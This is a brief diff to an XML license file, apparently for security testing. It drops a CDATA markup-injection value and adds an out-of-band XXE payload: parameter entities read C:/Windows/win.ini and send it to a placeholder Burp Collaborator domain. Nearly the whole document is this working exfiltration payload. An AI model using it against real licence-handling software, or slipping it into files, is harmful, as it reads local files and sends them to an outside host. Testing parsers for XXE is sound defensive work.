@@ -1,7 +1,11 @@
 
-BEGIN V2C
+<?xml version="1.0"?>
+<!DOCTYPE License [
+  <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
+  <!ENTITY % send SYSTEM "http://<your-burp-collaborator-domain>/?data=%file;">
+  %send;
+]>
 <License>
-  <Feature>FeatureA</Feature>
-  <Feature><![CDATA[</License><Injected>Malicious</Injected>]]></Feature>
+  <LicenseID>12345</LicenseID>
+  <CustomerName>Test</CustomerName>
 </License>
-END V2C
